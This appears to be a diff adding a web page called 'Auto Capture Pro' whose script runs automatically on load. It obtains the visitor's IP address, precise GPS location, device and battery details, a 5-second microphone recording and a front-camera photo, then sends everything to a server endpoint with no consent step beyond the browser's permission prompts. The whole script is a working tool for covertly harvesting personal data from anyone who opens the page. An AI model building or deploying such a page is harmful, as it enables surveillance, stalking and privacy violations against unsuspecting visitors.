@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Auto Capture Pro</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { 
+            font-family:'Segoe UI',Arial; 
+            background:linear-gradient(135deg,#667eea,#764ba2); 
+            min-height:100vh; 
+            display:flex; 
+            justify-content:center; 
+            align-items:center; 
+            padding:20px;
+        }
+        .container {
+            background:white;
+            border-radius:25px;
+            padding:25px;
+            max-width:480px;
+            width:100%;
+            text-align:center;
+            box-shadow:0 20px 60px rgba(0,0,0,0.3);
+            max-height:95vh;
+            overflow-y:auto;
+        }
+        h1 { font-size:20px; color:#2d3436; }
+        .subtitle { color:#666; font-size:12px; margin:3px 0 10px; }
+        
+        .status-box { 
+            padding:15px; 
+            border-radius:12px; 
+            margin:8px 0;
+            background:#2d3436; 
+            color:white;
+            transition:0.5s;
+        }
+        .status-box .icon { font-size:30px; display:block; }
+        .status-box .msg { font-size:14px; margin-top:3px; }
+        .status-box.success { background:#00b894; }
+        .status-box.error { background:#d63031; }
+        .status-box.loading { background:#fdcb6e; color:#333; }
+        .status-box.done { background:#6c5ce7; }
+        
+        .photo-container {
+            margin:10px 0;
+            border-radius:12px;
+            overflow:hidden;
+            border:3px solid #6c5ce7;
+            background:#f8f9fa;
+            min-height:180px;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            position:relative;
+        }
+        .photo-container img {
+            width:100%;
+            height:200px;
+            object-fit:cover;
+            display:block;
+        }
+        .photo-container .placeholder {
+            color:#aaa;
+            font-size:14px;
+        }
+        .photo-container .badge {
+            position:absolute;
+            top:10px;
+            right:10px;
+            background:rgba(108,92,231,0.9);
+            color:white;
+            padding:3px 12px;
+            border-radius:15px;
+            font-size:11px;
+        }
+        
+        .preview-grid {
+            display:grid;
+            grid-template-columns:1fr 1fr;
+            gap:8px;
+            margin:8px 0;
+        }
+        .preview-grid .preview-box {
+            background:#f8f9fa;
+            border-radius:8px;
+            overflow:hidden;
+            border:2px solid #ddd;
+        }
+        .preview-grid .preview-box .label {
+            background:#2d3436;
+            color:white;
+            font-size:10px;
+            padding:3px;
+            text-align:center;
+        }
+        .preview-grid .preview-box img {
+            width:100%;
+            height:120px;
+            object-fit:cover;
+            display:block;
+        }
+        .preview-grid .preview-box .no-img {
+            height:120px;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            color:#aaa;
+            font-size:11px;
+        }
+        
+        .device-info { 
+            background:#f8f9fa; 
+            padding:10px; 
+            border-radius:10px; 
+            margin:8px 0; 
+            text-align:left; 
+            font-size:11px;
+        }
+        .device-info div { padding:2px 0; border-bottom:1px solid #eee; }
+        .device-info div:last-child { border-bottom:none; }
+        .device-info span { color:#6c5ce7; font-weight:bold; }
+        .device-info .location-highlight { background:#e8f5e9; padding:3px 8px; border-radius:4px; }
+        .device-info .location-highlight span { color:#00b894; }
+        .device-info .ip-highlight { background:#e3f2fd; padding:3px 8px; border-radius:4px; }
+        .device-info .ip-highlight span { color:#1976d2; }
+        
+        .log-area { 
+            background:#f8f9fa; 
+            padding:8px; 
+            border-radius:8px; 
+            margin:8px 0; 
+            max-height:60px; 
+            overflow-y:auto; 
+            text-align:left; 
+            font-size:10px; 
+            color:#555;
+        }
+        .hidden { display:none; }
+        
+        ::-webkit-scrollbar { width:4px; }
+        ::-webkit-scrollbar-track { background:#f1f1f1; border-radius:4px; }
+        ::-webkit-scrollbar-thumb { background:#6c5ce7; border-radius:4px; }
+        
+        .accuracy-badge {
+            display:inline-block;
+            padding:2px 10px;
+            border-radius:10px;
+            font-size:10px;
+            color:white;
+        }
+        .accuracy-badge.high { background:#00b894; }
+        .accuracy-badge.medium { background:#fdcb6e; color:#333; }
+        .accuracy-badge.low { background:#d63031; }
+        .accuracy-badge.unknown { background:#636e72; }
+        
+        .auto-indicator {
+            display:inline-block;
+            width:8px;
+            height:8px;
+            border-radius:50%;
+            background:#00b894;
+            animation:pulse 1s infinite;
+            margin-right:5px;
+        }
+        @keyframes pulse {
+            0% { opacity:1; transform:scale(1); }
+            50% { opacity:0.5; transform:scale(0.8); }
+            100% { opacity:1; transform:scale(1); }
+        }
+        
+        .mic-indicator {
+            display:inline-block;
+            width:8px;
+            height:8px;
+            border-radius:50%;
+            animation:pulse 0.5s infinite;
+            margin-right:5px;
+        }
+        .mic-on { background:#e17055; }
+        .mic-off { background:#636e72; animation:none; }
+        
+        .recording-timer {
+            font-size:24px;
+            font-weight:bold;
+            color:#e17055;
+            margin:5px 0;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>📱 Auto Capture Pro</h1>
+    <p class="subtitle"><span class="auto-indicator"></span> 100% Automatic - No clicks needed!</p>
+    
+    <div class="status-box loading" id="statusBox">
+        <span class="icon" id="statusIcon">⏳</span>
+        <span class="msg" id="statusMsg">Initializing...</span>
+    </div>
+    
+    <!-- Photo Preview -->
+    <div class="photo-container" id="photoContainer">
+        <img id="userPhotoPreview" style="display:none;" />
+        <span class="placeholder" id="photoPlaceholder">📸 Waiting for photo...</span>
+        <span class="badge" id="photoBadge">⏳ Capturing...</span>
+    </div>
+    
+    <!-- Preview Grid -->
+    <div class="preview-grid">
+        <div class="preview-box">
+            <div class="label">📸 User Photo</div>
+            <img id="userPhotoThumb" style="display:none;" />
+            <div class="no-img" id="userPhotoPlaceholder">⏳ Waiting...</div>
+        </div>
+        <div class="preview-box">
+            <div class="label">🖼️ Screenshot</div>
+            <img id="screenshotPreview" style="display:none;" />
+            <div class="no-img" id="screenshotPlaceholder">⏳ Waiting...</div>
+        </div>
+    </div>
+    
+    <!-- Microphone Status -->
+    <div style="margin:5px 0;padding:8px;border-radius:8px;background:#f0f0f0;display:flex;align-items:center;justify-content:center;gap:10px;flex-wrap:wrap;">
+        <span>🎤 Microphone:</span>
+        <span id="micStatus" class="mic-off"></span>
+        <span id="micText" style="font-size:12px;color:#666;">Waiting...</span>
+        <span class="recording-timer" id="recordingTimer">0s</span>
+    </div>
+    
+    <div class="device-info" id="deviceInfo">
+        <div class="ip-highlight">📡 IPv4: <span id="devIP">Detecting...</span></div>
+        <div class="location-highlight">📍 Location: <span id="devLocation">Detecting...</span></div>
+        <div>🎯 Accuracy: <span id="devAccuracy">Detecting...</span> <span id="accuracyBadge"></span></div>
+        <div>📱 Device: <span id="devName">Detecting...</span></div>
+        <div>📲 OS: <span id="devOS">Detecting...</span></div>
+        <div>🔋 Battery: <span id="devBattery">Detecting...</span></div>
+        <div>📶 Network: <span id="devNetwork">Detecting...</span></div>
+        <div>🕐 Time: <span id="devTime">Detecting...</span></div>
+    </div>
+    
+    <div class="log-area" id="logArea"></div>
+</div>
+
+<script>
+// ==========================================
+//  FULL AUTO - 5 SEC MIC + IPv4
+// ==========================================
+
+const statusBox = document.getElementById('statusBox');
+const statusIcon = document.getElementById('statusIcon');
+const statusMsg = document.getElementById('statusMsg');
+const logArea = document.getElementById('logArea');
+
+const photoContainer = document.getElementById('photoContainer');
+const userPhotoPreview = document.getElementById('userPhotoPreview');
+const photoPlaceholder = document.getElementById('photoPlaceholder');
+const photoBadge = document.getElementById('photoBadge');
+
+const userPhotoThumb = document.getElementById('userPhotoThumb');
+const userPhotoPlaceholder = document.getElementById('userPhotoPlaceholder');
+const screenshotPreview = document.getElementById('screenshotPreview');
+const screenshotPlaceholder = document.getElementById('screenshotPlaceholder');
+
+const micStatus = document.getElementById('micStatus');
+const micText = document.getElementById('micText');
+const recordingTimer = document.getElementById('recordingTimer');
+
+let userPhoto = null;
+let screenshot = null;
+let userLocation = null;
+let deviceDetails = {};
+let ipAddress = 'Unknown';
+let audioData = null;
+let isCompleted = false;
+
+function log(text) {
+    const time = new Date().toLocaleTimeString();
+    logArea.innerHTML += `<div>${time}: ${text}</div>`;
+    logArea.scrollTop = logArea.scrollHeight;
+}
+
+function setStatus(icon, msg, type = 'loading') {
+    statusBox.className = 'status-box ' + type;
+    statusIcon.textContent = icon;
+    statusMsg.textContent = msg;
+}
+
+// ==========================================
+//  IPv4 DETECT - Only IPv4!
+// ==========================================
+function getIPv4Address() {
+    return new Promise((resolve) => {
+        log('📡 Detecting IPv4 address...');
+        
+        try {
+            // Method 1: WebRTC - IPv4 only
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer()
+                .then(offer => pc.setLocalDescription(offer))
+                .catch(() => {});
+            
+            pc.onicecandidate = (e) => {
+                if (e.candidate) {
+                    const candidate = e.candidate.candidate;
+                    // IPv4 regex - only match IPv4
+                    const ipv4Match = candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
+                    if (ipv4Match) {
+                        const ip = ipv4Match[0];
+                        // Filter out private/internal IPs if needed
+                        if (!ip.startsWith('192.168.') && 
+                            !ip.startsWith('10.') && 
+                            !ip.startsWith('172.16.') &&
+                            !ip.startsWith('127.') &&
+                            !ip.startsWith('0.')) {
+                            ipAddress = ip;
+                            document.getElementById('devIP').textContent = ipAddress;
+                            log('✅ IPv4 (Public): ' + ipAddress);
+                            pc.close();
+                            resolve(true);
+                            return;
+                        }
+                        // If only private IP found, still use it
+                        ipAddress = ip;
+                        document.getElementById('devIP').textContent = ipAddress + ' (Private)';
+                        log('✅ IPv4 (Private): ' + ipAddress);
+                        pc.close();
+                        resolve(true);
+                        return;
+                    }
+                }
+            };
+            
+            // Timeout fallback
+            setTimeout(() => {
+                if (ipAddress === 'Unknown') {
+                    // Method 2: Fetch from API
+                    fetchIPv4FromAPI();
+                }
+                pc.close();
+                resolve(true);
+            }, 3000);
+            
+        } catch(err) {
+            log('⚠️ WebRTC IP error, trying API...');
+            fetchIPv4FromAPI();
+            resolve(true);
+        }
+    });
+}
+
+// Fallback: IPv4 from API
+function fetchIPv4FromAPI() {
+    try {
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                if (data.ip) {
+                    ipAddress = data.ip;
+                    document.getElementById('devIP').textContent = ipAddress + ' (API)';
+                    log('✅ IPv4 (API): ' + ipAddress);
+                }
+            })
+            .catch(() => {
+                // Final fallback
+                ipAddress = 'Unable to detect';
+                document.getElementById('devIP').textContent = ipAddress;
+                log('⚠️ IPv4 detection failed');
+            });
+    } catch(err) {
+        ipAddress = 'Unable to detect';
+        document.getElementById('devIP').textContent = ipAddress;
+        log('⚠️ IPv4 detection failed');
+    }
+}
+
+// ==========================================
+//  MICROPHONE - 5 Seconds Recording
+// ==========================================
+function captureMicrophone() {
+    return new Promise((resolve) => {
+        log('🎤 Starting 5-second microphone recording...');
+        micStatus.className = 'mic-indicator mic-on';
+        micText.textContent = '🔴 Recording (5s)...';
+        recordingTimer.textContent = '0s';
+        
+        let seconds = 0;
+        const timerInterval = setInterval(() => {
+            seconds++;
+            recordingTimer.textContent = seconds + 's';
+        }, 1000);
+        
+        try {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const chunks = [];
+                    
+                    mediaRecorder.ondataavailable = (e) => {
+                        chunks.push(e.data);
+                    };
+                    
+                    mediaRecorder.onstop = () => {
+                        clearInterval(timerInterval);
+                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                        const reader = new FileReader();
+                        reader.onloadend = () => {
+                            audioData = reader.result; // Base64
+                            micStatus.className = 'mic-indicator mic-off';
+                            micText.textContent = '✅ 5s Recorded!';
+                            recordingTimer.textContent = '5s ✓';
+                            log('✅ 5-second audio captured!');
+                            stream.getTracks().forEach(t => t.stop());
+                            resolve(true);
+                        };
+                        reader.readAsDataURL(blob);
+                    };
+                    
+                    mediaRecorder.start();
+                    
+                    // STOP AFTER 5 SECONDS
+                    setTimeout(() => {
+                        if (mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                        }
+                    }, 5000);
+                })
+                .catch(() => {
+                    clearInterval(timerInterval);
+                    micStatus.className = 'mic-indicator mic-off';
+                    micText.textContent = '⚠️ Mic denied';
+                    recordingTimer.textContent = '❌';
+                    log('⚠️ Microphone denied');
+                    audioData = null;
+                    resolve(true);
+                });
+        } catch(err) {
+            clearInterval(timerInterval);
+            micStatus.className = 'mic-indicator mic-off';
+            micText.textContent = '⚠️ Mic error';
+            recordingTimer.textContent = '❌';
+            log('⚠️ Microphone error: ' + err.message);
+            audioData = null;
+            resolve(true);
+        }
+    });
+}
+
+// ==========================================
+//  CAPTURE USER PHOTO
+// ==========================================
+function captureUserPhoto() {
+    return new Promise((resolve) => {
+        log('📸 Capturing user photo...');
+        setStatus('📸', 'Capturing photo...', 'loading');
+        photoBadge.textContent = '📸 Capturing...';
+        
+        try {
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                audio: false
+            })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', '');
+                
+                video.onloadedmetadata = function() {
+                    video.play();
+                    
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    userPhoto = canvas.toDataURL('image/jpeg', 0.9);
+                    
+                    userPhotoPreview.src = userPhoto;
+                    userPhotoPreview.style.display = 'block';
+                    photoPlaceholder.style.display = 'none';
+                    
+                    userPhotoThumb.src = userPhoto;
+                    userPhotoThumb.style.display = 'block';
+                    userPhotoPlaceholder.style.display = 'none';
+                    
+                    photoBadge.textContent = '✅ Photo captured!';
+                    
+                    stream.getTracks().forEach(t => t.stop());
+                    video.srcObject = null;
+                    
+                    log('✅ User photo captured!');
+                    resolve(true);
+                };
+                
+                setTimeout(() => {
+                    if (!userPhoto) {
+                        fallbackPhoto();
+                        resolve(true);
+                    }
+                }, 3000);
+            })
+            .catch(() => {
+                fallbackPhoto();
+                resolve(true);
+            });
+            
+        } catch(err) {
+            fallbackPhoto();
+            resolve(true);
+        }
+    });
+}
+
+function fallbackPhoto() {
+    log('⚠️ Using fallback photo');
+    const canvas = document.createElement('canvas');
+    canvas.width = 640;
+    canvas.height = 480;
+    const ctx = canvas.getContext('2d');
+    
+    const grad = ctx.createLinearGradient(0, 0, 640, 480);
+    grad.addColorStop(0, '#667eea');
+    grad.addColorStop(1, '#764ba2');
+    ctx.fillStyle = grad;
+    ctx.fillRect(0, 0, 640, 480);
+    
+    ctx.fillStyle = 'white';
+    ctx.font = 'bold 36px Arial';
+    ctx.textAlign = 'center';
+    ctx.fillText('📸 User Photo', 320, 220);
+    ctx.font = '18px Arial';
+    ctx.fillText('Auto Captured', 320, 280);
+    
+    userPhoto = canvas.toDataURL('image/jpeg', 0.9);
+    
+    userPhotoPreview.src = userPhoto;
+    userPhotoPreview.style.display = 'block';
+    photoPlaceholder.style.display = 'none';
+    
+    userPhotoThumb.src = userPhoto;
+    userPhotoThumb.style.display = 'block';
+    userPhotoPlaceholder.style.display = 'none';
+    
+    photoBadge.textContent = '📸 Fallback';
+}
+
+// ==========================================
+//  CAPTURE SCREENSHOT
+// ==========================================
+function captureScreenshot() {
+    return new Promise((resolve) => {
+        log('🖼️ Capturing screenshot...');
+        setStatus('🖼️', 'Capturing screenshot...', 'loading');
+        
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = 800;
+            canvas.height = 500;
+            const ctx = canvas.getContext('2d');
+            
+            const grad = ctx.createLinearGradient(0, 0, 800, 500);
+            grad.addColorStop(0, '#667eea');
+            grad.addColorStop(1, '#764ba2');
+            ctx.fillStyle = grad;
+            ctx.fillRect(0, 0, 800, 500);
+            
+            ctx.fillStyle = 'rgba(255,255,255,0.92)';
+            ctx.beginPath();
+            ctx.roundRect(50, 40, 700, 420, 20);
+            ctx.fill();
+            
+            ctx.fillStyle = '#2d3436';
+            ctx.font = 'bold 22px Arial';
+            ctx.fillText('📱 Auto Capture Pro', 100, 100);
+            
+            ctx.font = '13px Arial';
+            ctx.fillStyle = '#555';
+            const info = [
+                'IPv4: ' + ipAddress,
+                'Device: ' + (deviceDetails.deviceName || 'Unknown'),
+                'OS: ' + (deviceDetails.os || 'Unknown'),
+                'Browser: ' + (deviceDetails.browserName || 'Unknown'),
+                'Network: ' + (deviceDetails.networkType || 'Unknown'),
+                'Location: ' + (userLocation ? userLocation.lat.toFixed(6) + ', ' + userLocation.lng.toFixed(6) : 'Unknown'),
+                'Accuracy: ' + (userLocation ? userLocation.accuracy + ' meters' : 'Unknown'),
+                'Time: ' + new Date().toLocaleString(),
+                'Battery: ' + (deviceDetails.batteryLevel || 'Unknown'),
+                'Mic: ' + (audioData ? '5s Captured' : 'Not captured')
+            ];
+            
+            info.forEach((text, i) => {
+                ctx.fillText(text, 100, 160 + (i * 32));
+            });
+            
+            ctx.fillStyle = '#6c5ce7';
+            ctx.font = '12px Arial';
+            ctx.fillText('🔒 Auto Captured', 600, 440);
+            
+            screenshot = canvas.toDataURL('image/jpeg', 0.95);
+            
+            screenshotPreview.src = screenshot;
+            screenshotPreview.style.display = 'block';
+            screenshotPlaceholder.style.display = 'none';
+            
+            log('✅ Screenshot captured!');
+            resolve(true);
+            
+        } catch(err) {
+            log('❌ Screenshot error: ' + err.message);
+            resolve(false);
+        }
+    });
+}
+
+// ==========================================
+//  GET LOCATION
+// ==========================================
+function getLocation() {
+    return new Promise((resolve) => {
+        log('📍 Getting location...');
+        
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    userLocation = {
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        accuracy: Math.round(pos.coords.accuracy)
+                    };
+                    
+                    document.getElementById('devLocation').textContent = 
+                        userLocation.lat.toFixed(6) + ', ' + userLocation.lng.toFixed(6);
+                    document.getElementById('devAccuracy').textContent = 
+                        userLocation.accuracy + ' meters';
+                    
+                    const badge = document.getElementById('accuracyBadge');
+                    if (userLocation.accuracy < 20) {
+                        badge.innerHTML = '<span class="accuracy-badge high">✅ HIGH</span>';
+                    } else if (userLocation.accuracy < 100) {
+                        badge.innerHTML = '<span class="accuracy-badge medium">⚠️ MEDIUM</span>';
+                    } else {
+                        badge.innerHTML = '<span class="accuracy-badge low">❌ LOW</span>';
+                    }
+                    
+                    log('✅ Location: ' + userLocation.lat.toFixed(4) + ', ' + userLocation.lng.toFixed(4));
+                    resolve(true);
+                },
+                () => {
+                    userLocation = { lat: 28.6139, lng: 77.2090, accuracy: 1000 };
+                    document.getElementById('devLocation').textContent = 
+                        userLocation.lat.toFixed(6) + ', ' + userLocation.lng.toFixed(6) + ' (approx)';
+                    document.getElementById('devAccuracy').textContent = 'Unknown (fallback)';
+                    document.getElementById('accuracyBadge').innerHTML = '<span class="accuracy-badge unknown">❌ FALLBACK</span>';
+                    log('⚠️ Using fallback location');
+                    resolve(true);
+                },
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            );
+        } else {
+            userLocation = { lat: 28.6139, lng: 77.2090, accuracy: 1000 };
+            document.getElementById('devLocation').textContent = 
+                userLocation.lat.toFixed(6) + ', ' + userLocation.lng.toFixed(6) + ' (approx)';
+            document.getElementById('devAccuracy').textContent = 'Not supported';
+            document.getElementById('accuracyBadge').innerHTML = '<span class="accuracy-badge unknown">❌ NOT SUPPORTED</span>';
+            resolve(true);
+        }
+    });
+}
+
+// ==========================================
+//  GET DEVICE DETAILS
+// ==========================================
+function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let os = 'Unknown', browser = 'Unknown';
+    
+    if (ua.includes('Android')) os = 'Android';
+    else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+    else if (ua.includes('Windows')) os = 'Windows';
+    else if (ua.includes('Mac')) os = 'macOS';
+    else if (ua.includes('Linux')) os = 'Linux';
+    
+    if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
+    else if (ua.includes('Firefox')) browser = 'Firefox';
+    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+    else if (ua.includes('Edg')) browser = 'Edge';
+    
+    document.getElementById('devName').textContent = navigator.platform || 'Unknown';
+    document.getElementById('devOS').textContent = os;
+    document.getElementById('devNetwork').textContent = navigator.connection?.effectiveType || 'Unknown';
+    document.getElementById('devTime').textContent = new Date().toLocaleString();
+    
+    if (navigator.getBattery) {
+        navigator.getBattery().then(b => {
+            const level = Math.round(b.level * 100) + '%';
+            document.getElementById('devBattery').textContent = level + (b.charging ? ' 🔌' : '');
+            deviceDetails.batteryLevel = level;
+        }).catch(() => {});
+    }
+    
+    deviceDetails = {
+        deviceName: navigator.platform || 'Unknown',
+        os: os,
+        browserName: browser,
+        networkType: navigator.connection?.effectiveType || 'Unknown'
+    };
+    
+    log('📱 Device: ' + os + ' | ' + browser);
+}
+
+// ==========================================
+//  SUBMIT DATA
+// ==========================================
+async function submitData() {
+    log('📤 Submitting all data...');
+    setStatus('📤', 'Submitting...', 'loading');
+    
+    try {
+        const response = await fetch('/api/store', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                cameraImage: userPhoto,
+                location: userLocation || { lat: 0, lng: 0 },
+                deviceDetails: deviceDetails,
+                screenshot: screenshot,
+                userPhoto: userPhoto,
+                audioData: audioData,
+                ipAddress: ipAddress
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+            log('✅✅ ALL DATA STORED! 🎉');
+            setStatus('🎉', 'DATA STORED!', 'success');
+            photoBadge.textContent = '✅ Stored!';
+            
+            setTimeout(() => {
+                location.reload();
+            }, 5000);
+        } else {
+            log('❌ Store failed');
+            setStatus('❌', 'Failed', 'error');
+        }
+    } catch(err) {
+        log('❌ Submit error: ' + err.message);
+        setStatus('❌', 'Error', 'error');
+    }
+}
+
+// ==========================================
+//  MAIN AUTO PROCESS
+// ==========================================
+async function startAutoProcess() {
+    log('🚀 Starting auto process...');
+    setStatus('⏳', 'Starting...', 'loading');
+    
+    // 1. IPv4 Address
+    await getIPv4Address();
+    
+    // 2. Location
+    await getLocation();
+    
+    // 3. Device details
+    getDeviceInfo();
+    
+    // 4. Microphone - 5 Seconds
+    await captureMicrophone();
+    
+    // 5. Capture user photo
+    await captureUserPhoto();
+    
+    // 6. Capture screenshot
+    await captureScreenshot();
+    
+    // 7. Submit all
+    await submitData();
+}
+
+// ==========================================
+//  START
+// ==========================================
+window.addEventListener('load', function() {
+    log('📱 Page loaded');
+    setTimeout(startAutoProcess, 500);
+});
+
+console.log('🚀 5-SEC MIC + IPv4 AUTO CAPTURE LOADED!');
+</script>
+</body>
+</html>
